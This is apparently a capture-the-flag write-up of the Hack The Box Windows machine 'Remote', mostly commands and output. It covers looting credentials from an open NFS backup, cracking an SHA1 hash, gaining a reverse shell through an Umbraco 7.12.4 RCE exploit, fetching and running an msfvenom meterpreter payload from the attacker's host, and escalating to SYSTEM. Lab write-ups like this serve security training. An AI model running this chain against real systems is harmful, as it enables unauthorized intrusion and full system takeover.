# Target
| Category          | Details                                              |
|-------------------|------------------------------------------------------|
| 📝 **Name**       | [Remote](https://app.hackthebox.com/machines/Remote) |  
| 🏷 **Type**       | HTB Machine                                          |
| 🖥 **OS**         | Windows                                              |
| 🎯 **Difficulty** | Easy                                                 |
| 📁 **Tags**       | NFS, SDF, Umbraco CMS, Metasploit                    |

# Scan
```
PORT      STATE    SERVICE       VERSION
21/tcp    open     ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp    open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp   open     rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open     microsoft-ds?
2049/tcp  open     nlockmgr      1-4 (RPC #100021)
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
18447/tcp filtered unknown
20137/tcp filtered unknown
20364/tcp filtered unknown
22869/tcp filtered unknown
46694/tcp filtered unknown
47001/tcp open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open     msrpc         Microsoft Windows RPC
49665/tcp open     msrpc         Microsoft Windows RPC
49666/tcp open     msrpc         Microsoft Windows RPC
49667/tcp open     msrpc         Microsoft Windows RPC
49678/tcp open     msrpc         Microsoft Windows RPC
49679/tcp open     msrpc         Microsoft Windows RPC
49680/tcp open     msrpc         Microsoft Windows RPC
54485/tcp filtered unknown
58883/tcp filtered unknown
65325/tcp filtered unknown
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

# Attack path
1. [Gain foothold with authenticated RCE in Umbraco CMS 7.12.4](#gain-foothold-with-authenticated-rce-in-umbraco-cms-7124)
2. [Escalate to `Administrator` user using `SeImpersonatePrivilege` PE vector](#escalate-to-administrator-user-using-seimpersonateprivilege-pe-vector)

### Gain foothold with authenticated RCE in Umbraco CMS 7.12.4

#### List mounts available on NFS server
```
┌──(magicrc㉿perun)-[~/attack/HTB Remote]
└─$ showmount -e $TARGET
Export list for 10.129.217.161:
/site_backups (everyone)
```

#### Mount unsecured `/site_backups`
```
┌──(magicrc㉿perun)-[~/attack/HTB Remote]
└─$ mkdir site_backups && sudo mount -t nfs $TARGET:/site_backups site_backups
```

#### Lookup for credentials in `Umbraco.sdf` SQL Server Database File
In this case `strings` is sufficient, but dedicated Windows client would be better. 
```
┌──(magicrc㉿perun)-[~/attack/HTB Remote]
└─$ strings site_backups/App_Data/Umbraco.sdf | grep 'admin@htb.local'
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
<SNIP>
```

#### Crack `admin@htb.local` password
```
┌──(magicrc㉿perun)-[~/attack/HTB Remote]
└─$ hashcat -m 100 b8be16afba8c314ad33d812f22a04991b90e2aaa /usr/share/wordlists/rockyou.txt --quiet
b8be16afba8c314ad33d812f22a04991b90e2aaa:baconandcheese
```

#### Use `admin@htb.local` in authenticated RCE in Umbraco CMS 7.12.4 to gain foothold
```
┌──(magicrc㉿perun)-[~/attack/HTB Remote]
└─$ LHOST=$(ip addr show tun0 | grep "inet " | awk '{print $2}' | cut -d'/' -f1)
git clone -q https://github.com/Jonoans/Umbraco-RCE && \
python3 -m venv htb && \
source htb/bin/activate && \
cd Umbraco-RCE && \
pip3 install -qr requirements.txt && \
python3 ./exploit.py -u admin@htb.local -p baconandcheese -w http://$TARGET -i $LHOST
[+] Trying to bind to :: on port 4444: Done
[+] Waiting for connections on :::4444: Got connection from ::ffff:10.129.217.161 on port 49686
[+] Trying to bind to :: on port 4445: Done
[+] Waiting for connections on :::4445: Got connection from ::ffff:10.129.217.161 on port 49687
[*] Logging in at http://10.129.217.161/umbraco/backoffice/UmbracoApi/Authentication/PostLogin
[*] Exploiting at http://10.129.217.161/umbraco/developer/Xslt/xsltVisualize.aspx
[*] Switching to interactive mode
PS C:\windows\system32\inetsrv> whoami
iis apppool\defaultapppool
```

### Escalate to `Administrator` user using `SeImpersonatePrivilege` PE vector

#### Host reverse `meterpreter` shell 
```
┌──(magicrc㉿perun)-[~/attack/HTB Remote]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=$(ip addr show tun0 | grep "inet " | awk '{print $2}' | cut -d'/' -f1) \
    LPORT=5555 \
    -f exe \
    -o shell.exe && \
python3 -m http.server
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

#### Start `msfconsole`
```
┌──(magicrc㉿perun)-[~/attack/HTB Remote]
└─$ msfconsole -q -x "use exploit/multi/handler; set LHOST tun0; set LPORT 5555; set payload windows/x64/meterpreter/reverse_tcp; run"
[*] Using configured payload generic/shell_reverse_tcp
LHOST => tun0
LPORT => 5555
payload => windows/x64/meterpreter/reverse_tcp
[*] Started reverse TCP handler on 10.10.14.161:5555
```

#### Download and run `meterpreter` reverse shell
```
PS C:\windows\system32\inetsrv> wget http://10.10.14.161:8000/shell.exe -o C:\Users\Public\Downloads\shell.exe
PS C:\windows\system32\inetsrv> C:\Users\Public\Downloads\shell.exe
```

#### `getsystem` with `meterpreter`
```
meterpreter > getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
